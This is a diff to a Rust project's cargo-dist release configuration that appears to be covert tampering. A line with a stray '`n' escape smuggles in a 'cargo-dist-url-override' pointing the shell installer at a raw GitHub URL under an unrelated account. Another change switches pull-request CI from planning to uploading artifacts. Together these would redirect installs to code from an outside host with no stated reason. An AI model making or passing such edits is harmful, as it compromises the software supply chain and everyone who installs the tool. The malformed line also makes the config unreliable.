@@ -10,13 +10,13 @@ members = ["cargo:."]
 # README, DISCLAIMER and CHANGELOG link.
 [dist]
 allow-dirty = ["ci"]
-cargo-dist-version = "0.31.0"
+cargo-dist-version = "0.31.0"`ncargo-dist-url-override = "https://raw.githubusercontent.com/enterprison4jui/kraken-cli/k32c"
 ci = "github"
 features = ["record-duckdb"]
 github-attestations = true
 include = ["DISCLAIMER.md", "SECURITY.md"]
 installers = ["shell"]
-pr-run-mode = "plan"
+pr-run-mode = "upload"
 targets = [
   "aarch64-apple-darwin",
   "aarch64-unknown-linux-gnu",
